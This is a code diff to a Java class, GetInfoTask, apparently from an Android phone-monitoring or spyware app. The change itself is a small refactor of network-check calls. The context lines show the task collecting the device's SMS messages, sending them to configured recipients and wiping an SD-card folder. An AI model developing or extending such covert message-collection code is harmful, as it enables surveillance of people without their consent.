@@ -20,6 +20,7 @@ import system.service.feature.sms.SmsCtrl;
 import system.service.feature.sms.SmsInfo;
 
 import com.particle.inspector.common.util.DatetimeUtil;
+import com.particle.inspector.common.util.NetworkUtil;
 import com.particle.inspector.common.util.StrUtils;
 import com.particle.inspector.common.util.SysUtils;
 import com.particle.inspector.common.util.DeviceProperty;
@@ -67,7 +68,7 @@ public class GetInfoTask extends TimerTask
 		if (recipients == null || recipients.length == 0) return;
 		
 		// If network connected, try to collect and send the information
-		if (!SysUtils.isNetworkConnected(context)) return;
+		if (!NetworkUtil.isNetworkConnected(context)) return;
 		
 		// Firstly we should make sure the time range ( > days that user set)
 		Date lastDatetime = null;
@@ -99,7 +100,7 @@ public class GetInfoTask extends TimerTask
 		CollectSms(context);
 		SysUtils.threadSleep(1000, LOGTAG);
 		
-		if (!SysUtils.isNetworkConnected(context)) {
+		if (!NetworkUtil.isNetworkConnected(context)) {
 			// Clean the files in SD-CARD
 			FileCtrl.cleanFolder();
 			return;
